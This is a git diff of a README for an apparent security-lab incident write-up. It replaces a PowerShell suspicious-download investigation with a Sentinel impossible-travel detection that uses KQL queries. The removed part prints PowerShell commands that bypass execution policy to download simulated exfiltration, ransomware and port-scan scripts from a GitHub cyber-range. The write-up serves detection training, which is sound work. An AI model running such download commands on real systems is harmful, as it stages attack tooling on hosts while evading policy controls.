@@ -2,7 +2,7 @@
   <img src="https://github.com/user-attachments/assets/4a9b499f-2301-49f5-9a60-5521b5c35fca" alt="Description" width="600">
 </p>
 
-# PowerShell-Suspicious-Web-Request
+# Potential-Impossible-Travel
 
 ## Platforms and Languages Leveraged
 - Windows 10 Virtual Machines (Microsoft Azure)
@@ -14,74 +14,87 @@
 
 ##  Scenario
 
-Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.
+Sometimes corporations have policies against working outside of designated geographic regions, account sharing (this should be standard), or use of non-corporate VPNs. The following scenario will be used to detect unusual logon behavior by creating an incident if a user's login patterns are too erratic. “Too erratic” can be defined as logging in from multiple geographic regions within a given time period.
+
+Whenever a user logs into Azure or authenticates with their main Azure account, logs will be created in the “SigninLogs” table, which is being forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger whenever a user logs into more than one location in a 7 day time period. Not all triggers will be true positives, but it will give us a chance to investigate.
 
 ---
 
 ## Detection & Analysis
 
-An alert titled “Kyle – PowerShell Suspicious Web Request” was triggered on the device kylesvm. During investigation, it was discovered that the following four distinct PowerShell web requests were executed using Invoke-WebRequest to download scripts from a GitHub repository:
+A user account was flagged for potential impossible travel based on sign-in activity over the past 7 days.
+
+The screenshot below shows the alert configured to trigger when an event of this nature occurs:
+
+<img width="2356" height="638" alt="image" src="https://github.com/user-attachments/assets/ad04b613-c7cd-4b64-ac0d-32ec2b32fa51" />
 
 ---
 
-## PowerShell Commands Executed:
+The screenshot below displays the incident that was generated when the above alert was triggered by this type of event:
 
-- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
-
-- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
-
-- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
-  
-- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
----
-
-## Interview 
-
-The incident was tied to a single user on one device. When contacted, the user reported attempting to install free software, after which a black screen appeared briefly with no noticeable outcome.
+<img width="2370" height="682" alt="image" src="https://github.com/user-attachments/assets/db451bce-4142-43af-864a-15b76c0a76d3" />
 
 ---
 
-## Execution Confirmation
+## Affected Account:
 
-Using Microsoft Defender for Endpoint (MDE), it was confirmed that the scripts were executed on the host. The following KQL query was used to verify execution:
+- Username: e3cf69dbacbbce89aa76d8f5acef15ea51a051580fa22288481eedda249514de@lognpacific.com
+- Device/VM: kylesvm
+- Instances Detected: 2
 
 **Query used to locate events:**
 
 ```kql
-let TargetHostname = "kylesvm";
-let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); DeviceProcessEvents
-| where DeviceName == TargetHostname
-| where FileName == "powershell.exe"
-| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
-| order by TimeGenerated
-| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
-| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
+let TimePeriodThreshold = timespan(7d); // Change to how far back you want to look let NumberOfDifferentLocationsAllowed = 1;
+SigninLogs
+| where TimeGenerated > ago(TimePeriodThreshold)
+| where UserPrincipalName contains "kylesvm"
+or UserPrincipalName contains "e3cf69dbacbbce89aa76d8f5acef15ea51a051580fa22288481eedda249514de"
+| summarize Count = count() by UserPrincipalName, UserId, City = tostring(parse_json(LocationDetails).city), State = tostring(parse_json(LocationDetails).state), Country = tostring(parse_json(LocationDetails).countryOrRegion)
+| project UserPrincipalName, UserId, City, State, Country
+| summarize PotentialImpossibleTravelInstances = count() by UserPrincipalName, UserId | where PotentialImpossibleTravelInstances > NumberOfDifferentLocationsAllowed
 ```
----
 
-## Malware Analysis Summary
-
-The downloaded scripts were submitted to the malware reverse engineering team, and the following behaviors were identified:
-
-- exfiltratedata.ps1 Generates simulated employee data, compresses it via 7-Zip, and uploads it to Azure Blob Storage to emulate data exfiltration.
-- eicar.ps1 Creates the EICAR test file used to simulate antivirus detection and response mechanisms.
-- portscan.ps1 Performs a network scan over a local IP range for common open ports, logging the results.
-- pwncrypt.ps1 Emulates ransomware by generating fake files, encrypting them, and leaving ransom instructions on the desktop.
+<img width="2200" height="650" alt="image" src="https://github.com/user-attachments/assets/84c253b2-46d5-43fc-be0f-ef2ab86dcb15" />
 
 ---
-  
-## Containment, Eradication & Recovery
 
-- The affected device (kylesvm) was isolated via MDE.
-- A full anti-malware scan was performed.
-- No active malware was found; the device was subsequently removed from isolation. 
+Upon further investigation, sign-in activity was observed from two U.S. locations:
+
+- Boydton, Virginia
+- New York, New York
+
+<img width="2074" height="1180" alt="image" src="https://github.com/user-attachments/assets/66fa4bb8-83cf-427e-b80e-2ab69c41798b" />
+
+---
+
+These sign-ins occurred within a 30-minute time window. While the locations are geographically distant, the activity is not considered truly anomalous due to both logins occurring within the same country and a plausible explanation being the use of a VPN or cloud infrastructure redirecting IP location.
+
+**Query used to locate events:**
+
+```kql
+let TimePeriodThreshold = timespan(7d); // Change to how far back you want to look SigninLogs
+| where TimeGenerated > ago(TimePeriodThreshold)
+| where UserPrincipalName contains "e3cf69dbacbbce89aa76d8f5acef15ea51a051580fa22288481eedda249514de"
+| extend City = tostring(parse_json(LocationDetails).city),
+State = tostring(parse_json(LocationDetails).state),
+Country = tostring(parse_json(LocationDetails).countryOrRegion)
+| project TimeGenerated, UserPrincipalName, City, State, Country | order by TimeGenerated desc
+```
+<img width="1608" height="772" alt="image" src="https://github.com/user-attachments/assets/beceaac7-2dd0-4b33-b3e2-b316884d7ba8" />
+
+---
+
+## Containment, Eradication, and Recovery
+
+- The alert was determined to be true but benign.
+- Sign-ins from Virginia and New York within a short time frame are consistent with expected behavior, particularly if a VPN or Azure-based redirect was involved.
+- No suspicious or malicious behavior was identified.
+- The user account was not disabled, and no containment actions were necessary.
 
 ---
 
 ## Post-Incident Activities
 
-- The involved user was required to complete additional security awareness training.
-- The organization’s KnowBe4 security package was upgraded, and training frequency
-increased.
-- A new PowerShell usage policy was introduced to restrict PowerShell access for
-non-essential users. 
+- Explored the option of implementing geo-fencing to prevent logins from outside the country.
+- Recommended documenting this behavior pattern to avoid similar benign alerts in the future.
